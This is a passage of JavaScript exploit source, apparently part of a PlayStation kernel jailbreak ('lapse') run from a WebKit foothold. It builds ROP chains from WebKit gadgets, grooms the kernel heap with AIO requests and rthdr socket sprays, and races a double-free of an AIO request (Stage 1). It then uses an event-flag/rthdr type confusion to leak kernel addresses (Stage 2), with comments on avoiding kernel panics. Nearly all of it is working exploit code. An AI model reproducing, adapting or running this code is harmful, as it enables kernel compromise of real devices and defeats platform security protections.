        if (rem > 0)
            this.aioMultiCancel(
                idsBuf.sub(batches * 4 * maxAioIds, 4 * rem,
                    "aio-cancel-tail"),
                rem, errsBuf);
    };

    LapseKernel.prototype.freeAios = function (idsBuf, numIds, doCancel) {
        if (doCancel === undefined) doCancel = true;
        var maxAioIds = this.config.maxAioIds;
        var errsBuf = this.alloc(4 * maxAioIds, 4, "aio-free-errs");
        var rem = numIds % maxAioIds;
        var batches = Math.floor((numIds - rem) / maxAioIds);
        for (var i = 0; i < batches; ++i) {
            var sub = idsBuf.sub(i * 4 * maxAioIds, 4 * maxAioIds,
                "aio-free-batch");
            if (doCancel) this.aioMultiCancel(sub, maxAioIds, errsBuf);
            this.aioMultiPoll(sub, maxAioIds, errsBuf);
            this.aioMultiDelete(sub, maxAioIds, errsBuf);
        }
        if (rem > 0) {
            var sub = idsBuf.sub(batches * 4 * maxAioIds, 4 * rem,
                "aio-free-tail");
            if (doCancel) this.aioMultiCancel(sub, rem, errsBuf);
            this.aioMultiPoll(sub, rem, errsBuf);
            this.aioMultiDelete(sub, rem, errsBuf);
        }
    };

    LapseKernel.prototype.freeAios2 = function (idsBuf, numIds) {
        this.freeAios(idsBuf, numIds, false);
    };

    LapseKernel.prototype.verifyReqs2 = function (buf, offset, cmd) {
        if (buf.get32(offset) !== cmd) return false;
        var prefixes = [];
        for (var i = 0x10; i <= 0x20; i += 8) {
            if (buf.get16(offset + i + 6) !== 0xFFFF) return false;
            prefixes.push(buf.get16(offset + i + 4));
        }
        var state1 = buf.get32(offset + 0x38);
        var state2 = buf.get32(offset + 0x3C);
        if (!(state1 > 0 && state1 <= 4) || state2 !== 0) return false;
        if (!buf.get64(offset + 0x40).isZero()) return false;
        for (var i = 0x48; i <= 0x50; i += 8) {
            if (buf.get16(offset + i + 6) === 0xFFFF) {
                if (buf.get16(offset + i + 4) !== 0xFFFF)
                    prefixes.push(buf.get16(offset + i + 4));
            } else if (i === 0x50 || !buf.get64(offset + i).isZero()) {
                return false;
            }
        }
        if (prefixes.length < 2) return false;
        var first = prefixes[0];
        for (var j = 1; j < prefixes.length; ++j)
            if (prefixes[j] !== first) return false;
        return true;
    };

    LapseKernel.prototype.validateLeakSnapshot = function (buf, options) {
        var buflen = options.buflen;
        var reqs2Off = options.reqs2Off;
        var fakeReqs3Off = options.fakeReqs3Off;
        var markerIndex = options.markerIndex;
        var rthdrSize = this.config.rthdrSize;
        function validOffset(offset) {
            return Number.isInteger(offset) && offset >= rthdrSize
                && offset + rthdrSize <= buflen
                && (offset % rthdrSize) === 0;
        }
        if (!validOffset(reqs2Off) || !validOffset(fakeReqs3Off))
            throw new Error("lapse: leak snapshot offsets are invalid");
        if (reqs2Off === fakeReqs3Off)
            throw new Error("lapse: leak snapshot objects overlap");
        if (!this.verifyReqs2(buf, reqs2Off, AIO_CMD_WRITE))
            throw new Error("lapse: reqs2 signature drifted in final snapshot");
        if (buf.get32(fakeReqs3Off + 4) !== options.markerValue)
            throw new Error("lapse: fake reqs3 marker drifted in final snapshot");
        var observedIndex = buf.get32(fakeReqs3Off + 8);
        if (!Number.isInteger(markerIndex) || markerIndex <= 0
                || markerIndex > options.socketCount
                || observedIndex !== markerIndex)
            throw new Error("lapse: fake reqs3 index drifted in final snapshot "
                + observedIndex + "/" + markerIndex);
        var reqs3Offset = options.reqs3Offset;
        if (!Number.isInteger(reqs3Offset) || reqs3Offset < 0
                || fakeReqs3Off + reqs3Offset + 0x40 > buflen)
            throw new Error("lapse: fake reqs3 layout is out of bounds");
        var reqs3 = fakeReqs3Off + reqs3Offset;
        if (buf.get32(reqs3) !== 1 || buf.get32(reqs3 + 4) !== 0
                || buf.get32(reqs3 + 8) !== AIO_STATE_COMPLETE
                || buf.get8(reqs3 + 0x0C) !== 0
                || buf.get32(reqs3 + 0x28) !== 0x067B0000
                || !buf.get64(reqs3 + 0x38).eq(U64.from(1)))
            throw new Error("lapse: fake reqs3 body drifted in final snapshot");
        if (options.expectedReqs1 !== undefined
                && !buf.get64(reqs2Off + 0x10).eq(
                    U64.from(options.expectedReqs1)))
            throw new Error("lapse: reqs1 pointer drifted during cancellation");
        if (options.expectedAioInfo !== undefined
                && !buf.get64(reqs2Off + 0x18).eq(
                    U64.from(options.expectedAioInfo)))
            throw new Error("lapse: aio_info pointer drifted during cancellation");
        return true;
    };

    // =====================================================================
    // Stage 0: Setup
    // =====================================================================

    LapseKernel.prototype.pinMainThread = function () {
        var original = this.alloc(0x10, 0x10, "lapse-main-cpuset-orig");
        var queried = this.callI32("native.exports.cpusetGetaffinity",
            [3, 1, -1, 0x10, original.address]);
        if (queried !== 0)
            throw new Error("lapse: main affinity query failed " + queried);
        this.mainOriginalAffinity = original;

        var allowedCores = [];
        var bytes = original.read(0, 0x10);
        for (var core = 0; core < bytes.length * 8; ++core)
            if (bytes[core >>> 3] & (1 << (core & 7))) allowedCores.push(core);
        if (!allowedCores.length) throw new Error("lapse: empty affinity mask");
        this.mainCore = allowedCores.indexOf(this.config.mainCore) >= 0
            ? this.config.mainCore : allowedCores[0];

        var origPrio = this.alloc(4, 4, "lapse-main-prio-orig");
        var queriedPriority = this.callI32("native.exports.rtprioThread",
            [0, 0, origPrio.address]);
        if (queriedPriority !== 0)
            throw new Error("lapse: main priority query failed "
                + queriedPriority);
        this.mainOriginalPriority = origPrio;

        var mask = this.alloc(0x10, 0x10, "lapse-main-cpuset");
        mask.put8(this.mainCore >>> 3, 1 << (this.mainCore & 7));
        this.mainAffinityApplied = true;
        var affinity = this.callI32("native.exports.cpusetSetaffinity",
            [3, 1, -1, 0x10, mask.address]);
        if (affinity !== 0) {
            this.mainAffinityApplied = false;
            throw new Error("lapse: main affinity failed " + affinity);
        }

        var rtprio = this.alloc(4, 4, "lapse-main-rtprio");
        rtprio.put16(0, 2);
        rtprio.put16(2, this.config.mainRtprio);
        this.mainPriorityApplied = true;
        var priority = this.callI32("native.exports.rtprioThread",
            [1, 0, rtprio.address]);
        if (priority !== 0) {
            this.mainPriorityApplied = false;
            throw new Error("lapse: main priority failed " + priority);
        }
    };

    LapseKernel.prototype.restoreMainThread = function () {
        var warnings = [];
        if (this.mainPriorityApplied && this.mainOriginalPriority) {
            var r = this.callI32("native.exports.rtprioThread",
                [1, 0, this.mainOriginalPriority.address]);
            if (r === 0) this.mainPriorityApplied = false;
            else warnings.push("priority restore failed " + r);
        }
        if (this.mainAffinityApplied && this.mainOriginalAffinity) {
            var r = this.callI32("native.exports.cpusetSetaffinity",
                [3, 1, -1, 0x10, this.mainOriginalAffinity.address]);
            if (r === 0) this.mainAffinityApplied = false;
            else warnings.push("affinity restore failed " + r);
        }
        return warnings;
    };

    LapseKernel.prototype.prepare = function () {
        var config = this.config;
        var currentPid = this.callI32("native.exports.getpid", []);
        if (currentPid <= 0)
            throw new Error("lapse: invalid preparation pid " + currentPid);
        this.currentPid = currentPid >>> 0;

        this.buffers.len = this.alloc(4, 4, "lapse-len");
        this.buffers.rthdr = this.alloc(config.rthdrSize, 8,
            "lapse-rthdr");
        this.buffers.leak = this.alloc(
            config.rthdrSize * config.leakRecords, 8, "lapse-leak");
        this.buffers.signal = this.alloc(8, 8, "lapse-signal");
        this.buffers.small = this.alloc(0x100, 8, "lapse-small");
        this.buffers.rw = this.alloc(0x4000, 0x10, "lapse-rw");

        this.pinMainThread();
        this.checkpoint("prepare-affinity", "Main thread pinned", true);

        var sockpairBuf = this.alloc(8, 4, "lapse-block-sp");
        if (this.callI32("native.exports.socketpair",
                [1, 1, 0, sockpairBuf.address]) !== 0)
            throw new Error("lapse: blocking socketpair failed");
        this.blockFd = sockpairBuf.get32(0) | 0;
        this.unblockFd = sockpairBuf.get32(4) | 0;

        var blockReqsBuf = this.alloc(0x28 * 2, 8, "lapse-block-reqs");
        for (var i = 0; i < 2; ++i) {
            blockReqsBuf.put32(i * 0x28 + 0x08, 1);
            blockReqsBuf.put32(i * 0x28 + 0x20, this.blockFd);
        }
        var blockIdBuf = this.alloc(4, 4, "lapse-block-id");
        if (this.aioSubmitCmd(AIO_CMD_READ, blockReqsBuf, 2, 3, blockIdBuf) !== 0)
            throw new Error("lapse: blocking AIO failed");
        this.blockId = blockIdBuf.get32(0);
        this.checkpoint("prepare-workers", "Blocking AIO workers ready", true);

        var numGroomReqs = 3;
        var groomReqs = this.makeReqs1(numGroomReqs);
        var groomIdsBuf = this.alloc(4 * config.groomGroups, 4,
            "lapse-groom-ids");
        // The reference groom deliberately creates one group ID for each
        // three-request submission. A multi submission instead creates three
        // IDs and triples the later cancellation surface and ID-buffer shape.
        this.groomIds = groomIdsBuf;
        this.groomIdCount = 0;
        var self = this;
        this.sprayAio(config.groomGroups, groomReqs, numGroomReqs, groomIdsBuf,
            false, undefined, function (count) {
                self.groomIdCount = count;
            });
        this.checkpoint("prepare-groomed",
            config.groomGroups + " AIO groups submitted");
        this.cancelAios(groomIdsBuf, config.groomGroups);
        this.groomCancelled = true;
        this.checkpoint("prepare-cancelled", "AIO groom cancelled");

        this.sds = [];
        for (var i = 0; i < config.spraySockets; ++i)
            this.sds.push(this.newSocket());
        this.sdsAlt = [];
        for (var i = 0; i < config.alternateSockets; ++i)
            this.sdsAlt.push(this.newSocket());
        this.checkpoint("prepare-complete", "Socket pools ready");
    };

    // =====================================================================
    // Stage 1: Double-free reqs2 via race
    // =====================================================================

    LapseKernel.prototype.makeAliasedRthdrs = function (fds, buf, rsize) {
        var config = this.config;
        for (var loop = 1; loop <= config.aliasAttempts; ++loop) {
            var count = Math.min(fds.length, config.spraySockets);
            for (var i = 0; i < count; ++i) {
                buf.put32(config.rthdrMarkerOffset, i + 1);
                this.setRthdr(fds[i], buf, rsize);
            }
            for (var i = 0; i < count; ++i) {
                var n = this.getRthdr(fds[i], buf, config.rthdrSize);
                if (n < 8) continue;
                var marker = buf.get32(config.rthdrMarkerOffset);
                var j = marker - 1;
                if (marker !== (i + 1) && j >= 0 && j < fds.length) {
                    var pair = [fds[i], fds[j]];
                    var maxIdx = Math.max(i, j);
                    var minIdx = Math.min(i, j);
                    fds.splice(maxIdx, 1);
                    fds.splice(minIdx, 1);
                    this.freeRthdrs(fds);
                    fds.push(this.newSocket());
                    fds.push(this.newSocket());
                    return pair;
                }
            }
        }
        return null;
    };

    LapseKernel.prototype.raceOne = function (reqAddrBuf, tcpSd,
            aliasRthdrBuf, aliasRthdrSize) {
        var RopChain = NS.RopChain;
        var kk = this.k.bind(this);

        var readySignal = this.alloc(8, 8, "lapse-race-ready");
        var deletionSignal = this.alloc(8, 8, "lapse-race-done");
        var exitSignal = this.alloc(8, 8, "lapse-race-exited");
        var tidBuf = this.alloc(8, 8, "lapse-race-tid");
        readySignal.put64(0, 0);
        deletionSignal.put64(0, 0);
        exitSignal.put64(0, 0);

        var sceErrs = this.alloc(8, 4, "lapse-race-errs");
        sceErrs.put32(0, 0xFFFFFFFF);
        sceErrs.put32(4, 0xFFFFFFFF);

        var racePipe = this.createPipePair("lapse-race-pipe");
        var pipeReadFd = racePipe[0];
        var pipeWriteFd = racePipe[1];
        var pipeBuf = this.alloc(8, 8, "lapse-race-pipebuf");

        var raceThread = this.alloc(8, 8, "lapse-race-thread");
        var raceContext = this.alloc(0x120, 0x10, "lapse-race-ctx");
        var raceStack = this.alloc(0x4000, 0x10, "lapse-race-rop");
        var raceName = this.alloc(0x20, 8, "lapse-race-name");
        raceName.putCString(0, "sk-lrace", 0x20);

        var cpuMask = this.alloc(0x10, 0x10, "lapse-race-cpuset");
        cpuMask.put8(this.mainCore >>> 3, 1 << (this.mainCore & 7));

        var rtprio = this.alloc(4, 4, "lapse-race-rtprio");
        rtprio.put16(0, 2);
        rtprio.put16(2, this.config.mainRtprio);

        var affinityResult = this.alloc(8, 8, "lapse-race-affinity-result");
        var priorityResult = this.alloc(8, 8, "lapse-race-priority-result");
        var waitDelay = this.alloc(16, 8, "lapse-race-wait-delay");
        affinityResult.put64(0, U64.ones());
        priorityResult.put64(0, U64.ones());
        waitDelay.put64(0, 0);
        waitDelay.put64(8, 1000000);

        var chain = new RopChain(raceStack, this.profile, this.webkitBase);

        chain.call(kk("native.exports.thrSelf"), [tidBuf.address]);
        chain.call(kk("native.exports.cpusetSetaffinity"),
            [3, 1, -1, 0x10, cpuMask.address]);
        chain.storeRax(affinityResult.address);
        chain.call(kk("native.exports.rtprioThread"), [1, 0, rtprio.address]);
        chain.storeRax(priorityResult.address);

        chain.push(chain.gadget("popRax"));
        chain.push(1);
        chain.push(chain.gadget("popRdi"));
        chain.push(readySignal.address);
        chain.push(chain.gadget("movPtrRdiRax"));

        chain.call(kk("native.exports.read"),
            [pipeReadFd, pipeBuf.address, 1]);

        chain.call(kk("native.exports.aioMultiDelete"),
            [reqAddrBuf.address, 1, sceErrs.address + 4]);

        chain.push(chain.gadget("popRax"));
        chain.push(1);
        chain.push(chain.gadget("popRdi"));
        chain.push(deletionSignal.address);
        chain.push(chain.gadget("movPtrRdiRax"));

        // Keep the joinable pthread parked after the vulnerable delete.  A
        // direct thr_exit, as used by the references, does no libc pthread
        // teardown.  pthread_exit can do that work before the main thread has
        // reclaimed the duplicated 0x80 allocation.  Reuse the race pipe as a
        // second gate and release it only after the rthdr alias is established.
        chain.call(kk("native.exports.read"),
            [pipeReadFd, pipeBuf.address, 1]);

        chain.push(chain.gadget("popRax"));
        chain.push(1);
        chain.push(chain.gadget("popRdi"));
        chain.push(exitSignal.address);
        chain.push(chain.gadget("movPtrRdiRax"));

        chain.call(kk("native.exports.pthreadExit"), [0]);

        var at = function (n) {
            return this.profile.offset("native.context.offsets." + n);
        }.bind(this);
        raceContext.put64(at("rip"), raceStack.get64(0));
        raceContext.put64(at("rsp"), raceStack.address + 8);

        var createResult = this.callI32("native.exports.pthreadCreate",
            [raceThread.address, 0, kk("native.context.setcontextEntry"),
                raceContext.address, raceName.address]);
        if (createResult !== 0)
            throw new Error("lapse: race thread create failed " + createResult);
        var threadStarted = true;
        var threadJoined = false;
        var threadSuspended = false;
        var pipeUnblocked = false;
        var reclaimGateReleased = false;
        var pipeWriteClosed = false;
        var tid = 0;
        var pthreadHandle = U64.zero();
        var wonRace = false;
        var unsafeRace = false;
        var reclaimComplete = false;
        var pair = null;
        var failure = null;
        this.attemptDiagnostics.racePhase = RACE_PHASE_NONE;

        try {
            // The worker is pinned at the same real-time priority. Sleeping,
            // as the reference does, lets it run and also bounds a bad start.
            this.waitThreadSignal(readySignal, "race thread readiness",
                waitDelay);
            this.attemptDiagnostics.racePhase = RACE_PHASE_WORKER_READY;

            var affinityStatus = affinityResult.get64(0).toInt32();
            var priorityStatus = priorityResult.get64(0).toInt32();
            if (affinityStatus !== 0 || priorityStatus !== 0)
                throw new Error("lapse: race scheduling failed affinity="
                    + affinityStatus + " priority=" + priorityStatus);

            tid = tidBuf.get32(0);
            if (tid === 0 || tid > 0x7FFFFFFF)
                throw new Error("lapse: race thread tid invalid " + tid);

            pthreadHandle = raceThread.get64(0);
            if (pthreadHandle.isZero())
                throw new Error("lapse: race pthread handle is empty");

            var suspendBuf = this.alloc(0x400, 0x10, "lapse-suspend-chain");
            var suspendChain = new NS.RopChain(suspendBuf, this.profile,
                this.webkitBase);
            var pipeWriteResult = this.alloc(8, 8,
                "lapse-race-unblock-result");
            pipeWriteResult.put64(0, U64.ones());
            suspendChain.call(kk("native.exports.write"),
                [pipeWriteFd, pipeBuf.address, 1]);
            suspendChain.storeRax(pipeWriteResult.address);
            suspendChain.call(kk("native.exports.schedYield"), []);
            suspendChain.call(kk("native.exports.thrSuspendUcontext"), [tid]);
            var suspendResult = this.bridge.callChain(
                suspendBuf, suspendChain.cursor).toInt32();
            threadSuspended = suspendResult === 0;
            if (threadSuspended)
                this.attemptDiagnostics.racePhase = RACE_PHASE_WORKER_SUSPENDED;
            var unblockCount = pipeWriteResult.get64(0).toInt32();
            if (unblockCount !== 1)
                throw new Error("lapse: race pipe unblock returned "
                    + unblockCount);
            pipeUnblocked = true;

            // A missed suspension is a clean race miss, not a reason to touch
            // the request concurrently without the worker held in place.
            if (!threadSuspended) {
                var missedSuspendGate = this.nativeWrite(
                    pipeWriteFd, pipeBuf, 1);
                if (missedSuspendGate !== 1)
                    throw new Error(
                        "lapse: missed race gate release returned "
                        + missedSuspendGate);
                reclaimGateReleased = true;
                this.waitThreadSignal(exitSignal, "missed race thread exit",
                    waitDelay);
                this.joinExitedThread(pthreadHandle, exitSignal,
                    "missed race pthread");
                threadJoined = true;
            } else {
                var pollErr = this.alloc(4, 4, "lapse-race-pollerr");
                this.aioMultiPoll(reqAddrBuf, 1, pollErr);
                var pollRes = pollErr.get32(0);

                var infoBuf = this.alloc(0x100, 8, "lapse-race-tcpinfo");
                var infoSize = this.getSockopt(tcpSd, 6, 0x20,
                    infoBuf, 0x100);
                if (infoSize < 1)
                    throw new Error("lapse: TCP_INFO returned no state");
                var tcpState = infoBuf.get8(0);

                if (pollRes !== SCE_KERNEL_ERROR_ESRCH
                        && tcpState !== TCPS_ESTABLISHED) {
                    // This is the first point at which the main thread can
                    // actually double-delete the worker's request.  Clean
                    // setup failures and ordinary race misses remain eligible
                    // for full cleanup before this transition.
                    this.enterUnsafe("lapse-first-double-delete");
                    unsafeRace = true;
                    this.attemptDiagnostics.racePhase
                        = RACE_PHASE_MAIN_DELETE_STARTED;
                    this.aioMultiDelete(reqAddrBuf, 1, sceErrs);
                    wonRace = true;
                    this.attemptDiagnostics.racePhase
                        = RACE_PHASE_MAIN_DELETE_RETURNED;
                }

                var resumeResult = this.callI32(
                    "native.exports.thrResumeUcontext", [tid]);
                if (resumeResult !== 0)
                    throw new Error("lapse: race thread resume failed "
                        + resumeResult);
                threadSuspended = false;
                if (unsafeRace)
                    this.attemptDiagnostics.racePhase
                        = RACE_PHASE_WORKER_RESUMED;

                if (wonRace) {
                    // The freed 0x80 object is panic-prone until an rthdr spray
                    // reclaims it. Match the PS5 reference: observe the worker's
                    // delete, validate both results, and reclaim before joining
                    // the worker or releasing any race descriptors.
                    this.waitThreadSignal(deletionSignal,
                        "race thread deletion", waitDelay);
                    this.attemptDiagnostics.racePhase
                        = RACE_PHASE_WORKER_DELETE_OBSERVED;
                    var errMain = sceErrs.get32(0);
                    var errWorker = sceErrs.get32(4);
                    if (errMain !== errWorker || errMain !== 0) {
                        throw new Error(
                            "lapse: double-delete status mismatch main=0x"
                            + errMain.toString(16) + " worker=0x"
                            + errWorker.toString(16));
                    }
                    this.attemptDiagnostics.racePhase
                        = RACE_PHASE_RTHDR_RECLAIM_STARTED;
                    pair = this.makeAliasedRthdrs(this.sds,
                        aliasRthdrBuf, aliasRthdrSize);
                    if (!pair) {
                        throw new Error(
                            "lapse: rthdr reclaim failed after double-delete");
                    }
                    reclaimComplete = true;
                    this.firstReclaimComplete = true;
                    this.attemptDiagnostics.racePhase
                        = RACE_PHASE_RTHDR_ALIAS_ACQUIRED;

                    var reclaimGate = this.nativeWrite(
                        pipeWriteFd, pipeBuf, 1);
                    if (reclaimGate !== 1)
                        throw new Error(
                            "lapse: reclaim gate release returned "
                            + reclaimGate);
                    reclaimGateReleased = true;

                    // pthread_exit leaves a joinable thread's stack/TLS
                    // allocated. Reap it only after the freed object has been
                    // reclaimed with the reference rthdr spray.
                    this.waitThreadSignal(exitSignal, "race thread exit",
                        waitDelay);
                    this.joinExitedThread(pthreadHandle, exitSignal,
                        "race pthread");
                    threadJoined = true;
                    this.attemptDiagnostics.racePhase
                        = RACE_PHASE_WORKER_JOINED;
                } else {
                    var missedRaceGate = this.nativeWrite(
                        pipeWriteFd, pipeBuf, 1);
                    if (missedRaceGate !== 1)
                        throw new Error(
                            "lapse: missed race gate release returned "
                            + missedRaceGate);
                    reclaimGateReleased = true;
                    this.waitThreadSignal(exitSignal,
                        "missed race thread exit", waitDelay);
                    this.joinExitedThread(pthreadHandle, exitSignal,
                        "missed race pthread");
                    threadJoined = true;
                }
            }
        } catch (error) {
            failure = error;
        } finally {
            var teardownSafe = !unsafeRace || reclaimComplete;
            if (threadStarted && !threadJoined && teardownSafe) {
                try {
                    if (!pipeUnblocked) {
                        var cleanupWrite = this.nativeWrite(
                            pipeWriteFd, pipeBuf, 1);
                        if (cleanupWrite !== 1) {
                            this.closeStrict(pipeWriteFd,
                                "race write-pipe emergency close");
                            pipeWriteClosed = true;
                        }
                        pipeUnblocked = true;
                    }
                    if (!reclaimGateReleased) {
                        if (!pipeWriteClosed) {
                            var cleanupGate = this.nativeWrite(
                                pipeWriteFd, pipeBuf, 1);
                            if (cleanupGate !== 1) {
                                this.closeStrict(pipeWriteFd,
                                    "race write-pipe gate close");
                                pipeWriteClosed = true;
                            }
                        }
                        reclaimGateReleased = true;
                    }
                    if (threadSuspended && tid > 0) {
                        var cleanupResume = this.callI32(
                            "native.exports.thrResumeUcontext", [tid]);
                        if (cleanupResume !== 0)
                            throw new Error("race pthread cleanup resume "
                                + cleanupResume);
                        threadSuspended = false;
                    }
                    if (pthreadHandle.isZero())
                        pthreadHandle = raceThread.get64(0);
                    if (!pthreadHandle.isZero()) {
                        this.waitThreadSignal(exitSignal,
                            "race cleanup thread exit", waitDelay);
                        this.joinExitedThread(pthreadHandle, exitSignal,
                            "race cleanup pthread");
                        threadJoined = true;
                    }
                } catch (cleanupError) {
                    if (!failure) failure = cleanupError;
                }
            }
            // Once the double-delete has happened, an unsuccessful reclaim
            // leaves the kernel heap unsafe. Resume a suspended worker so it
            // can reach the second pipe read, but leave that reclaim gate
            // closed and do not join it or release descriptor-backed kernel
            // objects on this failure path.
            if (threadStarted && !threadJoined && !teardownSafe
                    && threadSuspended && tid > 0) {
                try {
                    var unsafeResume = this.callI32(
                        "native.exports.thrResumeUcontext", [tid]);
                    if (unsafeResume === 0) threadSuspended = false;
                    else if (!failure)
                        failure = new Error("lapse: unsafe race resume failed "
                            + unsafeResume);
                } catch (resumeError) { if (!failure) failure = resumeError; }
            }
            if (teardownSafe) {
                var workerExited = exitSignal.get32(0) === 1;
                if (threadStarted && !threadJoined && !workerExited) {
                    this.enterUnsafe("lapse-race-thread-live");
                    if (!failure)
                        failure = new Error("lapse: race worker remains live");
                } else {
                    try {
                        if (this.callI32("native.exports.close", [pipeReadFd]) !== 0
                                && !failure)
                            failure = new Error(
                                "lapse: race read-pipe close failed");
                    } catch (closeError) { if (!failure) failure = closeError; }
                    try {
                        if (!pipeWriteClosed
                                && this.callI32("native.exports.close",
                                    [pipeWriteFd]) !== 0
                                && !failure)
                            failure = new Error(
                                "lapse: race write-pipe close failed");
                    } catch (closeError) { if (!failure) failure = closeError; }
                    if (unsafeRace && !failure)
                        this.attemptDiagnostics.racePhase
                            = RACE_PHASE_RESOURCES_CLOSED;
                }
            } else if (threadSuspended) {
                this.enterUnsafe("lapse-race-thread-live");
                if (!failure)
                    failure = new Error("lapse: race worker remains suspended");
            }
        }

        if (failure) throw failure;
        return pair;
    };

    LapseKernel.prototype.triggerDoubleFree = function () {
        var config = this.config;
        var serverAddr = this.alloc(16, 8, "lapse-server-addr");
        serverAddr.put8(1, 2);
        serverAddr.put32(4, 0x0100007f);

        var sdListen = -1;
        try {
            sdListen = this.newTcpSocket();
            var enable = this.alloc(4, 4, "lapse-enable");
            enable.put32(0, 1);
            this.setSockopt(sdListen, 0xFFFF, 4, enable, 4);

            if (this.callI32("native.exports.bind",
                    [sdListen, serverAddr.address, 16]) !== 0)
                throw new Error("lapse: bind failed");

            var addrLen = this.alloc(4, 4, "lapse-addrlen");
            addrLen.put32(0, 16);
            var nameResult = this.callI32("native.exports.getsockname",
                [sdListen, serverAddr.address, addrLen.address]);
            if (nameResult !== 0 || addrLen.get32(0) !== 16)
                throw new Error("lapse: getsockname failed " + nameResult
                    + " len=" + addrLen.get32(0));

            if (this.callI32("native.exports.listen", [sdListen, 1]) !== 0)
                throw new Error("lapse: listen failed");

            var numReqs = 3;
            var whichReq = numReqs - 1;
            var reqs = this.makeReqs1(numReqs);
            var aioIds = this.alloc(4 * numReqs, 4, "lapse-trigger-ids");
            var errors = this.alloc(4 * numReqs, 4, "lapse-trigger-errs");
            var aliasRthdrBuf = this.alloc(config.rthdrSize, 8,
                "lapse-alias-rthdr");
            var aliasRthdrSize = this.buildRthdr(
                aliasRthdrBuf, config.rthdrSize);

            for (var attempt = 1; attempt <= config.raceAttempts; ++attempt) {
                this.attemptDiagnostics.raceAttempt = attempt;
                var sdClient = -1;
                var sdConn = -1;
                var submitted = false;
                var deleted = false;
                try {
                    sdClient = this.callI32("native.exports.socket", [2, 1, 0]);
                    if (sdClient < 0) continue;
                    if (this.callI32("native.exports.connect",
                            [sdClient, serverAddr.address, 16]) !== 0)
                        continue;

                    sdConn = this.callI32("native.exports.accept",
                        [sdListen, 0, 0]);
                    if (sdConn < 0) continue;

                    var lingerBuf = this.alloc(8, 4, "lapse-linger");
                    lingerBuf.put32(0, 1);
                    lingerBuf.put32(4, 1);
                    this.setSockopt(sdClient, 0xFFFF, 0x80, lingerBuf, 8);
                    reqs.put32(whichReq * 0x28 + 0x20, sdClient);

                    if (this.aioSubmitCmd(AIO_CMD_MULTI_READ, reqs,
                            numReqs, 3, aioIds) !== 0)
                        continue;
                    submitted = true;
                    this.aioMultiCancel(aioIds, numReqs, errors);
                    this.aioMultiPoll(aioIds, numReqs, errors);
                    this.closeStrict(sdClient, "race client");
                    sdClient = -1;

                    var reqAddrBuf = aioIds.sub(whichReq * 4, 4,
                        "lapse-trigger-req");
                    var pair = this.raceOne(reqAddrBuf, sdConn,
                        aliasRthdrBuf, aliasRthdrSize);
                    this.aioMultiDelete(aioIds, numReqs, errors);
                    deleted = true;
                    if (pair) {
                        this.aliasedPair = pair;
                        // The corrupt request has been reclaimed and the
                        // surrounding AIO group has been retired.  It is now
                        // safe to let launcher bookkeeping touch storage/UI.
                        this.publishUnsafe();
                        this.checkpoint("race-won", "Attempt " + attempt, true);
                        return;
                    }
                } finally {
                    if (submitted && !deleted && !this.dirty) {
                        try { this.aioMultiDelete(aioIds, numReqs, errors); }
                        catch {}
                    }
                    var descriptorTeardownSafe = !this.dirty
                        || this.firstReclaimComplete;
                    if (sdClient >= 0 && descriptorTeardownSafe) {
                        try { this.closeStrict(sdClient, "race client"); }
                        catch {}
                    }
                    if (sdConn >= 0 && descriptorTeardownSafe) {
                        try { this.closeStrict(sdConn, "race connection"); }
                        catch {}
                    }
                }
            }
            throw new Error("lapse: race failed after " + config.raceAttempts
                + " attempts");
        } finally {
            if (sdListen >= 0
                    && (!this.dirty || this.firstReclaimComplete))
                this.closeStrict(sdListen, "race listener");
        }
    };

    // =====================================================================
    // Stage 2: Leak kernel addresses
    // =====================================================================

    LapseKernel.prototype.leakKernelAddresses = function () {
        var config = this.config;
        var sd = this.aliasedPair[0];
        var aliasedSd = this.aliasedPair[1];

        this.closeStrict(aliasedSd, "aliased rthdr peer");
        this.aliasedPair[1] = -1;

        var evfName = this.alloc(1, 1, "lapse-evf-name");
        var readBuf = this.alloc(config.rthdrSize, 8,
            "lapse-leak-rthdr");
        var evf = -1;
        var evfAttempt = 0;

        for (var attempt = 1; attempt <= config.aliasAttempts; ++attempt) {
            var handles = [];
            for (var j = 1; j <= config.eventHandles; ++j) {
                var flags = 0xF00 | (j << 16);
                var h = this.callI32("native.exports.evfCreate",
                    [evfName.address, 0, flags]);
                if (h < 0) break;
                handles.push(h);
            }

            readBuf.fill(0);
            var flagSize = this.getRthdr(sd, readBuf, config.rthdrSize);
            if (flagSize < 4) {
                for (var k = 0; k < handles.length; ++k)
                    this.callI32("native.exports.evfDelete", [handles[k]]);
                continue;
            }
            var flag = readBuf.get32(0);

            if ((flag & 0xF00) === 0xF00) {
                var idx = (flag >>> 16) & 0xFFFF;
                var expectedFlag = flag | 1;

                if (idx > 0 && idx <= handles.length) {
                    evf = handles[idx - 1];
                    var clearResult = this.callI32(
                        "native.exports.evfClear", [evf, 0]);
                    var setResult = this.callI32(
                        "native.exports.evfSet", [evf, expectedFlag]);
                    if (clearResult !== 0 || setResult !== 0)
                        throw new Error("lapse: evf flag update failed clear="
                            + clearResult + " set=" + setResult);
                    readBuf.fill(0);
                    var verifySize = this.getRthdr(
                        sd, readBuf, config.rthdrSize);

                    var val = verifySize >= 4 ? readBuf.get32(0) : 0;
                    if (val === (expectedFlag >>> 0)) {
                        handles.splice(idx - 1, 1);
                    } else {
                        evf = -1;
                    }
                }
            }

            for (var k = 0; k < handles.length; ++k)
                if (evf < 0 || handles[k] !== evf)
                    this.callI32("native.exports.evfDelete", [handles[k]]);

            if (evf >= 0) {
                evfAttempt = attempt;
                break;
            }
        }

        if (evf < 0)
            throw new Error("lapse: evf/rthdr confusion failed");

        var finalClear = this.callI32("native.exports.evfClear", [evf, 0]);
        var finalSet = this.callI32("native.exports.evfSet", [evf, 0xFF00]);
        if (finalClear !== 0 || finalSet !== 0)
            throw new Error("lapse: final evf flag update failed clear="
                + finalClear + " set=" + finalSet);
        readBuf.fill(0);
        var evfLeakSize = this.getRthdr(sd, readBuf, config.rthdrSize);
        if (evfLeakSize < 0x48)
            throw new Error("lapse: short evf leak " + evfLeakSize);

        var kernelAddr = readBuf.get64(0x28);
        var kbufAddr = readBuf.get64(0x40).sub(0x38);

        this.assertKernelPointer(kernelAddr, "evf string address");
        this.assertKernelPointer(kbufAddr, "evf buffer address");
        this.attemptDiagnostics.evfAttempt = evfAttempt;
        this.checkpoint("leak-evf", "EVF alias attempt " + evfAttempt, true);

        var wbuf = this.alloc(config.rthdrSize, 8, "lapse-leak-wbuf");
        var rsize = this.buildRthdr(wbuf, config.rthdrSize);
        var markerVal = 0xDEADBEEF;
        var reqs3Offset = 0x10;

        wbuf.put32(4, markerVal);
        wbuf.put32(reqs3Offset + 0x00, 1);
        wbuf.put32(reqs3Offset + 0x04, 0);
